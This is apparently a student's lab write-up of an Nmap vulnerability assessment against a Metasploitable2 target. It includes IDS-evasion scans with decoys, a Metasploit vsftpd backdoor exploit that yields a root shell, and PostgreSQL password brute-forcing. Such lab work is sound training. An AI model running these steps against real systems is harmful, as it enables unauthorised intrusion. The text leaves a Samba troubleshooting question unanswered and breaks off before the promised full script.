# Network Vulnerability Assessment With Nmap


## Overview:
This repository demonstrates a **Network Vulnerability Assessment (NVA)** using **Nmap**. The target is **Metasploitable2 (IP: 192.168.127.129)** in a lab environment. This project includes scanning, analysis, and a professional report for real-world cybersecurity experience.

## LAB TOOLS
- Attacker: Kali Linux (IP: 192.168.127.128)
- Victim: Windows 10 (IP: 192.168.127.130)
- Nmap



## Scope 
Client/Lab: Metasploitable2
Tester: Nin Kanong
Attacker: Kali Linux (192.168.127.128)
Target: Metasploitable2 (192.168.127.129) 
Date: 5/Sept/2025
Rules: Non-destructive scanning only (no exploitation)
Deliverables: Executive summary + technical findings + remediation + raw evidence



## Methodology

### Step 1: Workspace Setup
Create a professional folder structure for the VA:
````
mkdir -p Vulnerability_Assessment/{scans,reports,notes,scripts}
cd Vulnerability_Assessment
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
````
<img width="643" height="270" alt="image" src="https://github.com/user-attachments/assets/e01b8f92-d6f8-4f4e-866a-f7b3f3da9659" />



### Step 2: Discovery (Host is Online)
#### 1. Ping Sweep
````
ping -c 3 192.168.127.129
````
<img width="582" height="206" alt="image" src="https://github.com/user-attachments/assets/44c69390-2716-4191-828c-4b6d4e98e6c1" />



#### 2. Alternative Nmap Ping Scan
````
nmap -sn 192.168.127.129
````
<img width="594" height="154" alt="image" src="https://github.com/user-attachments/assets/e03e6126-f0c9-4a44-b51c-e11fce271089" />

- Nmap’s ping scan checks if host is alive without scanning ports.
- Only proceed to scanning if host is live. Avoids wasted scans.




### Step 3. Enumeration (Port & Service Discovery)
#### 1. Scan all TCP ports and detect services
````
nmap -p- -sV -O -T4 -oA scans/full_tcp_scan_$TIMESTAMP 192.168.127.129
````
<img width="915" height="782" alt="image" src="https://github.com/user-attachments/assets/836e4482-5b8c-4c98-84aa-b131e37681b8" />


- `-p-` : Scans all 65535 TCP ports (full port range).  
- `-sV` : Enables service version detection to identify application names and versions (e.g., OpenSSH 5.1, Apache 2.2).  
- `-O` : Enables OS detection to guess the target’s operating system based on network stack fingerprinting.  
- `-T4` : Sets the timing template to "aggressive" for faster scanning.  
- `-oA scans/full_tcp_scan_$TIMESTAMP` : Saves output in all formats (normal, XML, grepable) under the directory scans/ with a filename that includes the variable $TIMESTAMP (must be defined in the shell, e.g., export TIMESTAMP=$(date +%F_%T)).
- This command performs a comprehensive, fast TCP scan to identify all open ports, service versions, and the likely operating system, a standard step in penetration testing for full network reconnaissance. 



#### 2. Optional Advanced Enumeration
##### 1. UDP scan
````
sudo nmap -sU -p 53,67,68,69,161 -T4 -oA scans/udp_scan_$TIMESTAMP 192.168.127.129
````
<img width="717" height="268" alt="image" src="https://github.com/user-attachments/assets/968a53bf-8fae-4df2-97eb-80a83f01221e" />

- `-sU` : Performs a UDP scan to detect open UDP services.  
- `-p 53,67,68,69,161` : Scans specific UDP ports:  
    - `53` : DNS  
    - `67/68` : DHCP (server/client)  
    - `69` : TFTP (Trivial File Transfer Protocol)  
    - `161` : SNMP (Simple Network Management Protocol)
- `-T4` : Sets timing template to "aggressive" for faster scanning.  
- `-oA scans/udp_scan_$TIMESTAMP` : Saves output in all formats (normal, XML, grepable) under scans/ with a filename that includes the variable $TIMESTAMP (must be defined, e.g., export TIMESTAMP=$(date +%F_%T)).
- This command performs a fast, targeted UDP scan on key service ports, commonly used in internal network assessments to identify misconfigured or exploitable UDP-based services. 


##### 2. Firewall evasion:
````
nmap -f -D RND:5 -T4 -oA scans/stealth_scan_$TIMESTAMP 192.168.127.129
````
<img width="635" height="547" alt="image" src="https://github.com/user-attachments/assets/421975ac-f09e-4f42-a300-3a3e993e2d13" />


- `-f` : Fragments packets into smaller pieces (8-byte chunks), making it harder for basic firewalls or IDS to detect the scan.  
- `-D RND:5` : Adds 5 random decoy IP addresses to the scan, making it appear as if the scan is coming from multiple sources — helps obscure the attacker's real IP.  
- `-T4` : Sets timing template to "aggressive" for faster scanning (faster than default, but may be noisier).  
- `-oA scans/stealth_scan_$TIMESTAMP` : Saves output in all formats (normal, XML, grepable) under the directory scans/ with a filename that includes the variable $TIMESTAMP (must be defined, e.g., export TIMESTAMP=$(date +%F_%T)).
- This command performs a fast, stealthy scan using packet fragmentation and spoofed decoys to evade detection — useful in environments with basic firewall/IDS protections. Based on Nmap.org, Nmap supports advanced techniques for scanning networks with firewalls and filters, making it flexible and powerful for security auditing.



### 4. Vulnerability Identification
#### 1. Broad NSE Scripts
````
nmap -sV --script=vuln -oA scans/nse_vuln_$TIMESTAMP 192.168.127.129
````
<img width="983" height="664" alt="image" src="https://github.com/user-attachments/assets/e94cb792-e846-45d6-8753-1cb10096df25" />

<img width="973" height="681" alt="image" src="https://github.com/user-attachments/assets/94ce1db8-65c5-4cbf-8fed-8ea21b274f13" />

<img width="681" height="694" alt="image" src="https://github.com/user-attachments/assets/adc1b020-bad5-4b72-a6bc-447903d31251" />

<img width="974" height="691" alt="image" src="https://github.com/user-attachments/assets/75e1995f-decd-47f9-a2f2-7ae653994b21" />

<img width="984" height="674" alt="image" src="https://github.com/user-attachments/assets/e1e26cea-1c88-4397-8307-4edab3cbda53" />

<img width="813" height="642" alt="image" src="https://github.com/user-attachments/assets/5933ebba-a618-4ccd-9b7c-bf43e4c6bc91" />

<img width="853" height="542" alt="image" src="https://github.com/user-attachments/assets/e65f5118-2cd2-45b7-b2b0-083d675690b9" />


#### 2. SMB (Ports 139/445) – CVE-2007-2447 
````
nmap -p 139,445 --script=smb-vuln* -oA scans/smb_vuln_$TIMESTAMP 192.168.127.129
````
<img width="630" height="276" alt="image" src="https://github.com/user-attachments/assets/ff185c4f-79df-480c-9890-d656592e25e8" />

| **Script**            | **Checks For**               | **Result**     |
| --------------------- | ---------------------------- | -------------- |
| `smb-vuln-ms10-061`   | MS10-061 (Print Spooler RCE) | Not vulnerable |
| `smb-vuln-ms10-054`   | MS10-054 (SMB LPE)           | Not vulnerable |
| `smb-vuln-regsvc-dos` | Remote Registry DoS          | Script failed  |

- Why You Didn’t Detect CVE-2007-2447 (Samba RCE) 
We're scanning Metasploitable2, which is vulnerable to CVE-2007-2447 (Samba usermap script RCE), but we didn’t see it. 
- Because: 
    - The script smb-vuln-cve2007-2447 exists in Nmap’s NSE library.
    - But your command used --script=smb-vuln*, which should include it.
    - So why wasn’t it run?
     

#### 3. FTP (Port 21)
````
nmap -p 21 --script=ftp-vsftpd-backdoor,ftp-anon -oA scans/ftp_vuln_$TIMESTAMP 192.168.127.129
````
<img width="828" height="421" alt="image" src="https://github.com/user-attachments/assets/ae9cad2d-b084-48e7-b35f-60978d588797" />


##### How hacker exploit it:
- Open other terminal:
````
ftp 192.168.127.129
````
<img width="587" height="306" alt="image" src="https://github.com/user-attachments/assets/b2fce9af-219a-407f-bbe1-fa90e147426a" />

It will connect via FTP. But until we know username and password.

- use metasploit
````
msfconsole
````
<img width="593" height="416" alt="image" src="https://github.com/user-attachments/assets/4af752d3-08d4-4210-8205-6f5d5137f181" />

````
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.127.129
run
````
<img width="631" height="402" alt="image" src="https://github.com/user-attachments/assets/5ced2647-a245-4c23-97d3-52cd5f31ae9e" />

- We can get root:
````
whoami
````
<img width="626" height="201" alt="image" src="https://github.com/user-attachments/assets/f9863703-a7a2-48a1-b317-081558fa35fe" />




#### 4. HTTP (Port 80)
````
nmap -p 80 --script=http-vuln-* -oA scans/http_vuln_$TIMESTAMP 192.168.127.129
````
<img width="687" height="207" alt="image" src="https://github.com/user-attachments/assets/038cfe9c-18ee-4376-a7c9-e24917376caa" />


##### How hacker exploit Port 80
- Use Netcat or Telnet to grab the raw HTTP banner:
````
nc -nv 192.168.127.129 80
HEAD / HTTP/1.1
Host: 192.168.127.129
````
<img width="647" height="688" alt="image" src="https://github.com/user-attachments/assets/21662e12-2558-463f-ad23-e107636f19e5" />

- Use curl:
````
curl -I http://192.168.127.129
````
<img width="411" height="144" alt="image" src="https://github.com/user-attachments/assets/c9f5ab63-78ff-4254-aa2c-e48c3ef1184e" />




#### 5. MySQL (Port 3306)
````
nmap -p 3306 --script=mysql-vuln-cve2012-2122 -oA scans/mysql_vuln_$TIMESTAMP 192.168.127.129
````
<img width="810" height="199" alt="image" src="https://github.com/user-attachments/assets/0e8af730-9b1a-4af3-96a5-2a936d169880" />



#### 6. Telnet (Port 23)
````
nmap -p 23 --script=telnet-ntlm-info -oA scans/telnet_info_$TIMESTAMP 192.168.127.129
````
<img width="659" height="182" alt="image" src="https://github.com/user-attachments/assets/444078e5-ea1b-4eda-99c9-0900ba11354a" />



#### 7. PostgreSQL (Port 5432)
````
nmap -p 5432 --script=pgsql-brute --script-args=passdb=/usr/share/wordlists/metasploit/postgres_default_pass.txt -oA scans/pgsql_brute_$TIMESTAMP 192.168.127.129
````
<img width="982" height="200" alt="image" src="https://github.com/user-attachments/assets/79f607da-c79d-4de2-912e-16161fe3441d" />



#### =====>>> Finished of NVA with nmap


## Full Script of NVA with Nmap

#### Work flow
- Creates the workspace
- Runs discovery (ping scan)
- Performs full TCP/UDP scans
- Runs NSE vulnerability scripts for SMB, FTP, HTTP, MySQL, Telnet, PostgreSQL
- Saves outputs in structured folders with timestamps
- Converts XML → HTML
- Generates a Markdown report and PDF including screenshots placeholders
- Handles logging and errors

#### 1. Save script:
````
nano VA_Nmap.sh
````






























